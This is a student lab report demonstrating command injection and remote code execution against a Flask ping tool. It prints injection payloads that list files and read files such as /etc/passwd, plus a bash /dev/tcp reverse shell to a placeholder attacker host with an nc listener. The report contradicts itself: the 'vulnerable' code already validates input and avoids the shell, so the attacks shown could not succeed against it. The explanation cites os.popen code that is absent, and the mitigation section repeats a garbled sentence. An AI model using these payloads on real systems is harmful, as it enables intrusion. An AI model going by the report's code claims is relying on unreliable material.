# PRACTICAL REPORT Lab 03

## Title: Command Injection & RCE

#### **Name:** Sonam Dorji Ghalley

#### **Student ID:** 02230299

#### **Course/Unit:** DBS302

## 1. Aim

The demonstration shows how command injection vulnerabilities exist in web applications and how attackers use them to execute Remote Code Execution RCE attacks through a vulnerable Flask application.

## 2. Objectives

After completing this practical, we will be able to:

- Understand command injection vulnerabilities
- Explain how unsanitised user input leads to RCE
- Perform command injection attacks using payloads
- Execute a reverse shell attack
- Analyse security risks and propose mitigation techniques

## 3. System Setup / Requirements

### **Hardware & Software**

- Kali Linux (Attacker Machine)
- Ubuntu Linux (Victim Machine)
- Python 3
- Flask Framework
- Netcat (nc)

## **4. Procedure (Step-by-Step Execution)**

NOTE: Since i don’t have a ubuntu victim machine i will be doing both the attack and victim machine on my same virtual machine 

**Step 1:** we need to install the Flask library using the following command 

```bash
sudo apt update
sudo apt install python3-pip -y
pip3 install flask
```

Since it is already installed in my machine, so lets proceed with the other steps 

**Step 2: Create Vulnerable Flask Application**

We will be creating a simple server using the library that we installed earlier 

```python
from flask import Flask, request
import subprocess
import re

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <h2>Ping Tool</h2>
    <form action="/ping">
        Enter IP: <input name="ip">
        <input type="submit">
    </form>
    '''

@app.route('/ping')
def ping():
    ip = request.args.get("ip", "")

    # allow only digits and dots
    if not re.match(r'^[0-9\.]+$', ip):
        return "Invalid IP"

    try:
        result = subprocess.run(
            ["ping", "-c", "1", ip],
            capture_output=True,
            text=True,
            timeout=5
        )
        return f"<pre>{result.stdout}</pre>"
    except Exception as e:
        return f"Error: {str(e)}"

app.run(host="0.0.0.0", port=5000)
```

This application takes user input and directly executes it using system commands, making it vulnerable to command injection.

**Explain why this app is vulnerable**

The application shows security weaknesses because of its design problems.

The practical work uses `request.args.get("ip")` to get user input from the request. The program combines user input through `ping -c 1 " + ip` to make a system command. The operating system runs the command that `os.popen()` executes through its shell. The system operates without any input validation mechanisms.

The shell can execute additional commands because it recognizes special operators which include `;` and `&&.`

![image.png](PRACTICAL%20REPORT%20Lab%2003/image.png)

![image.png](PRACTICAL%20REPORT%20Lab%2003/image%201.png)

**Step 3: Run the Flask Application**

```bash
python3 app.py
```

![image.png](PRACTICAL%20REPORT%20Lab%2003/image%202.png)

when we check the IP of the vulnerable machine using the command 

```bash
ip a 
```

![image.png](PRACTICAL%20REPORT%20Lab%2003/image%203.png)

this is the output we are getting `192.168.216.132`

Access the application on the kali machine 

![image.png](PRACTICAL%20REPORT%20Lab%2003/image%204.png)

on a normal test input we the following

![image.png](PRACTICAL%20REPORT%20Lab%2003/image%205.png)

### Attack 1 : File List

command:

```bash
<IP>; ls
```

![image.png](PRACTICAL%20REPORT%20Lab%2003/image%206.png)

### Attack 2: Read File

```bash
<IP>; cat app.py
```

![image.png](PRACTICAL%20REPORT%20Lab%2003/image%207.png)

### Attack 3: **Identify User**

```bash
<IP>; && whoami
```

since im using my own machine with the user name `sonam-d`   so im getting the output as below

![image.png](PRACTICAL%20REPORT%20Lab%2003/image%208.png)

## **5. Reverse Shell (Full Control)**

#### Listener on kali

we set a listener on kali using the following command

```bash
nc -lvnp 4444
```

![image.png](PRACTICAL%20REPORT%20Lab%2003/image%209.png)

#### **Inject Payload (via app)**

```bash
<IP>; bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
```

**Payload Breakdown**

`bash -i` : interactive shell

`/dev/tcp/KALI_IP/4444` : connect to attacker

`>&`  : redirect output

`0>&1` : link input/output

![image.png](PRACTICAL%20REPORT%20Lab%2003/image%2010.png)

upon submitting the query we get the following in the listener 

![image.png](PRACTICAL%20REPORT%20Lab%2003/image%2011.png)

Victim connects back, the attacker has the full system access gained.

## 6. Answers to Questions

**Q1. What vulnerability is present?**

The web application contains a serious security vulnerability because it allows for command injection attacks. The application fails to validate user input which leads to direct input being used in system commands without any validation or sanitization process.

in this case, the application is expected to run a command such as:

```bash
ping -c 1 127.0.0.1
```

However, because the input contains a semicolon (`;`) followed by another command:

```bash
cat /etc/passwd
```

The operating system shell interprets it as two separate commands. The application executes two commands which include the ping command and the command that shows the contents of the /etc/passwd file.

The attacker has the ability to execute any command on the server which will result in:

- exposure of sensitive system files
- unauthorised access
- data theft
- remote code execution (RCE)

The system has a security flaw which enables attackers to execute commands that lead to RCE attacks.

**Q2. Why does `;` allow multiple commands to execute?**

The semicolon `;` is a special shell operator that acts as a command separator. In Linux and Unix-based systems, the shell uses `;`to separate one command from another because it enables the operating system to execute the first command in full before moving on to the second command.

The attackers use `;` in their command injection attacks because it serves their purpose. The attacker can execute extra harmful commands through the system by using this separator in shell command execution when user input gets directly added to shell commands.

The dangerous nature of direct shell execution with unsanitised input exists because this specific behaviour enables attackers to execute harmful commands.

**Q3. Why did the reverse shell initially fail with “bad fd number”?**

The reverse shell initially failed because of an issue with **file descriptor redirection syntax**.

A reverse shell payload typically uses input/output redirection operators such as:

```bash
>&
0>&1
```

The operators send all standard input and output plus error streams to the remote attacker who then gets access to an interactive shell session.

The bad fd number error occurs when

- the redirection syntax is incorrect
- the shell being used does not support that syntax
- quotes are placed incorrectly
- Bash is not explicitly called
- the payload is copied with formatting errors

The shell fails to understand file descriptor connections when the payload gets typed incorrectly which leads to this specific error.

**Q4. Why must the listener run on Kali before sending the payload?**

We need to activate the listener on the Kali machine before we can send the reverse shell payload because the victim system requires an operational link to establish connection. The Ubuntu victim machine initiates a connection to Kali on a designated port when the reverse shell payload is activated. The connection request will not succeed because Kali needs to be in listening mode for any process to receive the incoming connection.

**Q5. Explain how a reverse shell bypasses firewall restrictions.**

The reverse shell establishes its connection from the victim machine which allows it to bypass firewall security measures that protect against external attacks. Firewalls serve their primary security function by blocking all incoming connections while they permit outgoing connections to enable systems to access the internet.

In a reverse shell attack:

- the victim machine sends an outbound connection request
- the firewall system permits this connection to pass through its security measures
- the attacker receives the connection and gains shell access

Reverse shells represent a severe security threat because they use outbound traffic which organizations treat as less important than incoming traffic.

The server establishes a connection to the attacker instead of the attacker attempting to access the server directly.

**Q6. What is the difference between input and payload?**

- Input: full user-provided data
- Payload: malicious part of the input

**Q7. Write the secure version of [app.py](http://app.py/) and prevent the application from RCE.**

```bash
from flask import Flask, request
import subprocess
import re

app = Flask(__name__)

@app.route('/ping')
def ping():
    ip = request.args.get("ip", "")

    # Validate input (allow only numbers and dots)
    if not re.match(r'^[0-9\.]+$', ip):
        return "Invalid IP"

    try:
        result = subprocess.run(
            ["ping", "-c", "1", ip],
            capture_output=True,
            text=True
        )
        return f"<pre>{result.stdout}</pre>"
    except Exception as e:
        return str(e)

app.run(host="0.0.0.0", port=5000)
```

The security updates were developed to stop Remote Code Execution attacks through their use of secure coding techniques.

Input Validation:

- The regular expression permits only IP address valid character input which consists of numbers and dots. This blocks special character input which includes ; and && and | characters.

Safe Command Execution: 

- The subprocess.run() function requires users to provide multiple arguments through a list format instead of using one string. This feature prevents shell execution to interpret any special characters in the input.

No Shell Invocation: 

- The system blocks command injection attacks because it doesn't use shell command processing for any command execution.
Error Handling:
The system uses exception handling methods to manage all operations while preventing system crashes through uncontrolled exceptions.

The application defense system stops command injection attacks which enables RCE attacks to build RCE attacks. The application defense system stops command injection attacks which enables RCE attacks to build RCE attacks.

## 7. Summary Analysis

The demonstration shows how incorrect user input handling creates security weaknesses that enable attackers to perform command injection and remote code execution. Through step-by-step exploitation, it was observed that attackers can execute arbitrary commands and access sensitive data and gain full system control through reverse shells. The exercise demonstrates the need for secure coding practices through its focus on input validation and safe command execution methods. The implementation of security measures will successfully block attacks while safeguarding systems from exploitation attempts.

## 8. Conclusion

The laboratory successfully showed how command injection works together with its resulting effects. The study shows that user input validation needs to happen together with secure system command execution methods to achieve protection against RCE vulnerabilities.